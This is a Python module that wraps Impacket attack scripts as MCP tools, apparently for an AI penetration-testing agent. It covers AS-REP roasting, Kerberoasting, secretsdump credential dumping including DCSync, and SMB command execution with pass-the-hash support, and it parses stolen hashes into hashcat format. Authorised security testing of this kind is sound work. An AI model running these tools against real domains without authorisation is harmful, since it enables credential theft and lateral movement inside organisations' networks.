# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Aaron K. Clark
"""Impacket suite wrappers.

Five separate MCP tools share this module because they all wrap
scripts from the same `impacket-scripts` apt package and share the
Kerberos-target / domain-credential argv conventions:

  - impacket_getnpusers (GetNPUsers.py)   — AS-REP roastable users
  - impacket_getuserspns (GetUserSPNs.py) — Kerberoastable SPNs
  - impacket_secretsdump (secretsdump.py) — DCSync / SAM / LSA dump
  - impacket_smbclient (smbclient.py)     — one-shot SMB command

Each wrapper goes through ``@active_tool`` with ``secret_flags``
declared so the audit log never carries password literals.
"""

from __future__ import annotations

import re
from typing import Any

from .. import run
from ._active import active_tool

# Matches `user:rid:lmhash:nthash:::` (the secretsdump SAM/LSA hash
# line format) and the DCSync variant `domain\user:rid:lm:nt:::`.
_HASH_LINE = re.compile(
    r"^(?P<principal>[^:]+):(?P<rid>\d+):(?P<lmhash>[0-9a-fA-F]{32}):(?P<nthash>[0-9a-fA-F]{32}):::"
)


# ---------- GetNPUsers ----------

@active_tool(
    tool_name="impacket-getnpusers",
    secret_flags={"-password"},
)
async def getnpusers(
    *,
    target: str,
    dc_ip: str = "",
    user_list: str = "",
    timeout_seconds: int = 120,
) -> dict[str, Any]:
    """List AS-REP-roastable users.

    Args:
      target: AD domain (e.g. ``corp.local``).
      dc_ip: DC IP. Required for cross-realm or air-gapped DNS.
      user_list: file of usernames to test. If empty,
        GetNPUsers requires authenticated bind via ``-no-pass``
        + ``<domain>/<user>:<password>``-style target.
      timeout_seconds: hard wallclock cap (default 120).

    Returns ``parsed``: ``{users_no_preauth: [{user, hash}]}``.
    """
    domain = target
    argv: list[str] = ["impacket-GetNPUsers", f"{domain}/", "-format", "hashcat"]
    if user_list:
        argv.extend(["-usersfile", user_list])
        argv.append("-no-pass")
    if dc_ip:
        argv.extend(["-dc-ip", dc_ip])

    result = await run.run(argv, timeout=timeout_seconds)
    stdout = result.get("stdout", "") or ""
    parsed: dict[str, Any] = {"users_no_preauth": []}
    for line in stdout.splitlines():
        s = line.strip()
        if not s.startswith("$krb5asrep$"):
            continue
        # Format: $krb5asrep$23$user@DOMAIN:hash
        m = re.match(r"\$krb5asrep\$\d+\$([^@]+)@\S+:(\S+)", s)
        if m:
            parsed["users_no_preauth"].append({
                "user": m.group(1),
                "hash": s,  # full hashcat-compatible token
            })
    result["parsed"] = parsed
    return result


# ---------- GetUserSPNs ----------

@active_tool(
    tool_name="impacket-getuserspns",
    secret_flags={"-password"},
)
async def getuserspns(
    *,
    target: str,
    username: str,
    password: str = "",
    nthash: str = "",
    dc_ip: str = "",
    timeout_seconds: int = 180,
) -> dict[str, Any]:
    """Enumerate Kerberoastable SPNs.

    Args:
      target: AD domain (e.g. ``corp.local``).
      username: domain user to authenticate as.
      password: password literal. Mutually exclusive with ``nthash``.
      nthash: NT hash for pass-the-hash auth.
      dc_ip: DC IP.
      timeout_seconds: hard wallclock cap (default 180).

    Returns ``parsed``: ``{spns: [{user, spn, hash}]}``.
    """
    domain = target
    if nthash:
        creds = f"{domain}/{username}"
        auth_args = ["-hashes", f":{nthash}"]
    else:
        creds = f"{domain}/{username}:{password}"
        auth_args = []
    argv: list[str] = ["impacket-GetUserSPNs", creds, "-request", "-format", "hashcat", *auth_args]
    if dc_ip:
        argv.extend(["-dc-ip", dc_ip])

    result = await run.run(argv, timeout=timeout_seconds)
    stdout = result.get("stdout", "") or ""
    parsed: dict[str, Any] = {"spns": []}
    # GetUserSPNs prints a table-like header then krb5tgs hashes.
    # Map user/SPN to hash by line proximity is brittle; instead
    # capture each $krb5tgs$ hash and infer the user from its body.
    for line in stdout.splitlines():
        s = line.strip()
        if not s.startswith("$krb5tgs$"):
            continue
        # Format: $krb5tgs$23$*user$DOMAIN$spn*$...
        m = re.match(r"\$krb5tgs\$\d+\$\*([^$]+)\$[^$]+\$([^*]+)\*", s)
        if m:
            parsed["spns"].append({
                "user": m.group(1),
                "spn": m.group(2),
                "hash": s,
            })
    result["parsed"] = parsed
    return result


# ---------- secretsdump ----------

@active_tool(
    tool_name="impacket-secretsdump",
    secret_flags={"-password", "-hashes"},
)
async def secretsdump(
    *,
    target: str,
    username: str = "",
    password: str = "",
    nthash: str = "",
    just_dc: bool = False,
    timeout_seconds: int = 600,
) -> dict[str, Any]:
    """Dump credentials from a Windows host or domain controller.

    Args:
      target: target hostname or IP. For DCSync use the DC.
      username: AD user with sufficient privilege (DA or Replicate
        rights for DCSync; local Administrator for SAM/LSA dump).
      password / nthash: auth method.
      just_dc: if True, run DCSync only (``-just-dc-user`` /
        ``-just-dc``).
      timeout_seconds: hard wallclock cap (default 600).

    Returns ``parsed``: ``{secrets: [{principal, rid, lmhash,
    nthash}], kerberos_keys: [...], cleartext: [...]}``.
    """
    if not username:
        return run.error_result(
            "secretsdump needs `username`.",
            parsed={"secrets": [], "kerberos_keys": [], "cleartext": []},
        )
    if nthash:
        target_spec = f"{username}@{target}"
        auth_args = ["-hashes", f":{nthash}"]
    elif password:
        target_spec = f"{username}:{password}@{target}"
        auth_args = []
    else:
        return run.error_result(
            "secretsdump needs `password=` or `nthash=`.",
            parsed={"secrets": [], "kerberos_keys": [], "cleartext": []},
        )

    argv: list[str] = ["impacket-secretsdump", target_spec, *auth_args]
    if just_dc:
        argv.append("-just-dc")

    result = await run.run(argv, timeout=timeout_seconds)
    stdout = result.get("stdout", "") or ""
    parsed: dict[str, Any] = {"secrets": [], "kerberos_keys": [], "cleartext": []}
    section = None
    for line in stdout.splitlines():
        s = line.strip()
        if not s:
            continue
        if "Kerberos keys grabbed" in s or "Decrypting hash for user" in s:
            section = "kerberos"
            continue
        if "Cleartext password" in s.lower():
            section = "cleartext"
            continue
        m = _HASH_LINE.match(s)
        if m:
            parsed["secrets"].append({
                "principal": m.group("principal"),
                "rid": int(m.group("rid")),
                "lmhash": m.group("lmhash"),
                "nthash": m.group("nthash"),
            })
            continue
        if section == "kerberos" and ":" in s:
            parsed["kerberos_keys"].append(s)
    result["parsed"] = parsed
    return result


# ---------- smbclient (single command) ----------

@active_tool(
    tool_name="impacket-smbclient",
    secret_flags={"-password", "-hashes"},
)
async def smbclient(
    *,
    target: str,
    username: str,
    password: str = "",
    nthash: str = "",
    command: str = "shares",
    timeout_seconds: int = 120,
) -> dict[str, Any]:
    """One-shot SMB shell via impacket smbclient.py.

    Args:
      target: SMB server hostname / IP.
      username: AD or local user.
      password / nthash: auth.
      command: smbclient command to run (e.g. ``shares``,
        ``ls C$``, ``use ADMIN$;ls``). Default ``shares``.
      timeout_seconds: hard wallclock cap (default 120).

    Returns ``parsed``: ``{command, output_lines: [...]}``.
    """
    if nthash:
        target_spec = f"{username}@{target}"
        auth_args = ["-hashes", f":{nthash}"]
    elif password:
        target_spec = f"{username}:{password}@{target}"
        auth_args = []
    else:
        return run.error_result(
            "smbclient needs `password=` or `nthash=`.",
            parsed={"command": command, "output_lines": []},
        )

    argv: list[str] = [
        "impacket-smbclient", target_spec, *auth_args,
    ]
    # impacket-smbclient is interactive — pipe the command via stdin.
    stdin = (command + "\nexit\n").encode("utf-8")
    result = await run.run(argv, timeout=timeout_seconds, stdin=stdin)
    stdout = result.get("stdout", "") or ""
    # Strip the interactive prompt + command echo; keep response lines.
    lines = [
        line for line in stdout.splitlines()
        if line.strip() and not line.strip().startswith("#")
    ]
    result["parsed"] = {"command": command, "output_lines": lines}
    return result
